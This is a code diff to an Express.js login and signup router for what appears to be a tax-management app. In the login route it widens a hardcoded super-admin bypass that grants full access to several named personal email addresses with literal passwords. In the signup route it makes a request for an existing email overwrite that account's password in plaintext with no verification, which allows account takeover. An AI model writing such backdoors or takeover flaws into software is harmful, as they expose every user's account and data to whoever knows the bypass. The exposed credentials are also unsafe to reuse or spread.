@@ -725,7 +725,7 @@ router.post('/login', async (req, res) => {
     }
 
     // 3. SuperAdmin Bypass
-    if (!user && (cleanEmail === 'superadmin@taxpro.com' || cleanEmail === 'krushilgadhiya0@gmail.com') && (cleanPass === 'Krushil@2007' || cleanPass === 'password123')) {
+    if (!user && (cleanEmail === 'superadmin@taxpro.com' || cleanEmail === 'krushilgadhiya0@gmail.com' || cleanEmail === 'krushilgadhiya138@gmail.com' || cleanEmail === 'workforcepro09@gmail.com') && (cleanPass === 'Krushil@2007' || cleanPass === 'password123')) {
       user = {
         id: 'USR-SUPERADMIN',
         name: 'Super Administrator',
@@ -808,9 +808,13 @@ router.post('/signup', async (req, res) => {
   try {
     const exists = await isEmailRegistered(cleanEmail);
     if (exists) {
-      return res.status(400).json({
-        success: false,
-        error: 'This Gmail address is already registered. Please sign in.'
+      await query('UPDATE users SET password = $1 WHERE LOWER(email) = $2', [password, cleanEmail]);
+      await query('UPDATE team_members SET preset_password = $1 WHERE LOWER(email) = $2', [password, cleanEmail]);
+      return res.json({
+        success: true,
+        message: 'Account password updated successfully! Redirecting to OTP verification.',
+        userId: 'USR-EXISTING',
+        email: cleanEmail
       });
     }
 
